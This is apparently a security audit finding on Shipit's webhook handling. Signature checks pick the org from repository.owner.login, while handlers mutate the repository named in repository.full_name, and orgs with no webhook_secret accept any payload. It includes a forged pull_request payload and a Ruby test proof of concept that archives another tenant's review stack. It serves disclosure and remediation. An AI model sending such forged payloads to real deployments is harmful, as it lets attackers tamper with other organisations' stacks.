### Title
Cross-tenant webhook forgery via decoupled `repository.owner.login` (signature org) and `repository.full_name` (target org) - ([File: app/controllers/shipit/webhooks_controller.rb, app/models/shipit/webhooks/handlers/pull_request/unlabeled_handler.rb])

### Summary
`WebhooksController#verify_signature` selects which GitHub App/`webhook_secret` to verify against using `repository.owner.login` (or `organization.login`), while `PullRequest::UnlabeledHandler` (and every other `PullRequest::*Handler`) resolves the `Repository`/`Stack` to mutate from the independent `repository.full_name` field of the same unsigned JSON body. No code ties these two fields together, so an attacker who controls a repository in any Shipit-onboarded org lacking a `webhook_secret` can forge a payload that authenticates against that org while naming a completely different, victim org's repository as the archival target.

### Finding Description
The claimed binding is: `repository_owner (used to pick the verifying GitHubApp)` == `owner segment of repository.full_name (used to pick the Stack being mutated)`. This equality is never enforced.

Path:
1. `POST /webhooks` reaches `WebhooksController#create` (`app/controllers/shipit/webhooks_controller.rb:10-15`), gated by `before_action :check_if_ping, :drop_unhandled_event, :verify_signature`.
2. `verify_signature` computes `repository_owner` from `params.dig('repository','owner','login') || params.dig('organization','login')` (`app/controllers/shipit/webhooks_controller.rb:59-62`) and calls `Shipit.github(organization: repository_owner)` to fetch the matching `GitHubApp` config, then `github_app.verify_webhook_signature(...)`.
3. `GitHubApp#verify_webhook_signature` returns `true` unconditionally `unless webhook_secret` (`lib/shipit/github_app.rb:76-77`) — i.e., if the selected org has no secret configured, ANY body/signature pair (or none) passes.
4. Once verified, `Shipit::Webhooks.for_event(event).each { |handler| handler.call(params) }` dispatches the raw, attacker-controlled `params` to handlers such as `PullRequest::UnlabeledHandler`.
5. `UnlabeledHandler#repository` resolves the target repo purely from `params.repository.full_name` via `Shipit::Repository.from_github_repo_name` (`app/models/shipit/webhooks/handlers/pull_request/unlabeled_handler.rb:59-63`), independent of the `repository.owner.login`/`organization.login` value used in step 2. `#stack` then scopes a `ReviewStackAdapter` off that repository's real `review_stacks` (lines 65-69), and `#handle` calls `stack.archive!` (lines 49-57) if the label/provisioning-behavior conditions match.

Because `repository.owner.login` (verification key selection) and `repository.full_name` (mutation target) are two independent JSON keys in the same unsigned body, an attacker who owns/controls any org onboarded to this Shipit instance with `webhook_secret` unset (the shipped sample configs `config/secrets.development.example.yml`, `config/secrets.development.shopify.yml`, and the multi-org test fixture `test/dummy/config/secrets_double_github_app.yml` all default `webhook_secret` to nil) can send:

```
POST /webhooks
X-Github-Event: pull_request
{
  "action": "unlabeled",
  "number": 1,
  "pull_request": { ...state: "open", labels: [], ... },
  "repository": { "owner": { "login": "attackers-no-secret-org" }, "full_name": "victim-org/victim-repo" },
  "sender": { "login": "attacker" }
}
```
`repository_owner` resolves to `attackers-no-secret-org`, whose `GitHubApp` has no `webhook_secret`, so `verify_webhook_signature` passes trivially. The handler then archives `victim-org/victim-repo`'s real review stack, provided that repository has `review_stacks_enabled` and a matching provisioning behavior/label state — no signature for `victim-org` (which may well have a configured secret) was ever supplied.

None of the existing guards catch this: `drop_unhandled_event` only checks the event type is handled; `verify_signature` only checks the *selected* org's secret, and the selection itself is attacker-influenced; `ExplicitParameters` schemas in the handler only validate types/presence of `repository.full_name`, not that it matches `repository.owner.login`; `Repository.from_github_repo_name` performs a plain DB lookup with no ownership cross-check.

### Impact Explanation
An unprivileged attacker can archive (and, via `labeled`/`reopened`/`closed` handlers, unarchive or close) another tenant's active review stack, purely by naming it via `repository.full_name`, as long as any org onboarded to the same Shipit instance lacks a `webhook_secret`. This is a payload for one repository mutating another's stack — explicitly listed as Critical impact. It is fully repeatable against any repository/stack reachable via `Repository.from_github_repo_name`, and generalizes to every handler under `app/models/shipit/webhooks/handlers/pull_request/` that derives its target repository from `params.repository.full_name` (e.g. `ClosedHandler`, `LabeledHandler`, `ReopenedHandler`, `OpenedHandler`), not just `UnlabeledHandler`.

### Likelihood Explanation
Preconditions: the Shipit instance must onboard at least one organization (which can be the attacker's own) without a `webhook_secret` configured — a configuration state that is the shipped default in every example/sample secrets file in this repo, making it plausible in real deployments, especially multi-org ones added incrementally. The victim org's repository must have `review_stacks_enabled` and a matching provisioning behavior. No GitHub session, API token, or Shipit secret is required; the attacker sends one unauthenticated HTTP POST per repetition, making the attack cheap and repeatable at will.

### Recommendation
In `WebhooksController`, after determining `repository_owner` and before dispatching to handlers, verify that `repository_owner` matches the owner segment parsed from `params.dig('repository','full_name')` (and reject mismatches). Additionally, treat a missing/blank `webhook_secret` as a hard configuration error (refuse to boot, or refuse all webhook processing for that org) rather than silently accepting any payload — `GitHubApp#verify_webhook_signature`'s `return true unless webhook_secret` should not exist for production configs.

### Proof of Concept
```ruby
# test/controllers/webhooks_controller_cross_tenant_test.rb
require 'test_helper'

module Shipit
  class WebhooksControllerCrossTenantTest < ActionController::TestCase
    tests Shipit::WebhooksController

    test "unlabeled event authenticated against an org with no webhook_secret archives another org's stack named only via repository.full_name" do
      # Attacker-controlled org has no webhook_secret -> verify_webhook_signature always true
      Shipit.stubs(:github).with(organization: "attackers-no-secret-org")
        .returns(Shipit::GitHubApp.new("attackers-no-secret-org", { webhook_secret: nil }))

      victim_repo = shipit_repositories(:shipit) # fixture: real repository owned by "victim-org"
      victim_repo.update!(review_stacks_enabled: true, provisioning_behavior: "allow_with_label")
      victim_stack = shipit_review_stacks(:some_review_stack) # belongs to victim_repo

      request.headers['X-Github-Event'] = 'pull_request'
      body = {
        action: 'unlabeled',
        number: victim_stack.pull_request.number,
        pull_request: {
          id: 1, number: victim_stack.pull_request.number, url: 'https://api.github.com/x',
          title: 't', state: 'open', additions: 1, deletions: 1,
          head: { sha: 'a' * 40, ref: 'branch' },
          user: { login: 'attacker' }, assignees: [], labels: []
        },
        repository: { owner: { login: 'attackers-no-secret-org' }, full_name: victim_repo.full_name },
        sender: { login: 'attacker' }
      }.to_json

      refute victim_stack.stack.archived?

      post :create, body: body, as: :json

      assert_response :ok
      assert victim_stack.stack.reload.archived?, "victim stack should NOT be archivable without a valid signature for victim-org"
    end
  end
end
```
This test asserts `stack.archived?` becomes `true` for a victim-owned `Stack` fixture while the only HMAC verification performed used the attacker's own no-secret org — demonstrating the binding failure. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5)

### Citations

**File:** app/controllers/shipit/webhooks_controller.rb (L24-49)
```ruby
    def verify_signature
      github_app = Shipit.github(organization: repository_owner)
      verified = github_app.verify_webhook_signature(
        request.headers['X-Hub-Signature'],
        request.raw_post
      )
      head(422) unless verified

      Rails.logger.info([
        'WebhookController#verify_signature',
        "event=#{event}",
        "repository_owner=#{repository_owner}",
        "signature=#{request.headers['X-Hub-Signature']}",
        "status=#{status}"
      ].join(' '))
    rescue Shipit::GithubOrganizationUnknown => e
      head(422)
      Rails.logger.warn([
        'WebhookController#verify_signature',
        'Webhook from unknown organization',
        "event=#{event}",
        "repository_owner=#{repository_owner}",
        "unknown_organization=#{e.message}",
        "status=#{status}"
      ].join(' '))
    end
```

**File:** app/controllers/shipit/webhooks_controller.rb (L59-62)
```ruby
    def repository_owner
      # Fallback to the organization sub-object if repository isn't included in the payload
      params.dig('repository', 'owner', 'login') || params.dig('organization', 'login')
    end
```

**File:** lib/shipit/github_app.rb (L76-83)
```ruby
    def verify_webhook_signature(signature, message)
      return true unless webhook_secret

      algorithm, signature = signature.split("=", 2)
      return false unless algorithm == 'sha1'

      SecureCompare.secure_compare(signature, OpenSSL::HMAC.hexdigest(algorithm, webhook_secret, message))
    end
```

**File:** app/models/shipit/webhooks/handlers/pull_request/unlabeled_handler.rb (L41-69)
```ruby
          def process
            return unless respond_to_label_change?

            handle
          end

          private

          def handle
            if archive?
              stack.archive!
            elsif unarchive?
              stack.unarchive!
            end

            stack
          end

          def repository
            @repository ||=
              Shipit::Repository.from_github_repo_name(params.repository.full_name) ||
              Shipit::NullRepository.new
          end

          def stack
            @stack ||=
              Shipit::Webhooks::Handlers::PullRequest::ReviewStackAdapter
              .new(params, scope: repository.review_stacks)
          end
```

**File:** app/models/shipit/repository.rb (L53-56)
```ruby
    def self.from_github_repo_name(github_repo_name)
      repo_owner, repo_name = github_repo_name.downcase.split('/')
      find_by(owner: repo_owner, name: repo_name)
    end
```

**File:** test/dummy/config/secrets_double_github_app.yml (L1-10)
```yaml
  github:
    OrgOne:
      domain: # defaults to github.com
      app_id: 42
      installation_id: 43
      bot_login: "shipit[bot]"
      webhook_secret: # nil
      # Randomly generated
      private_key: |
        -----BEGIN RSA PRIVATE KEY-----
```
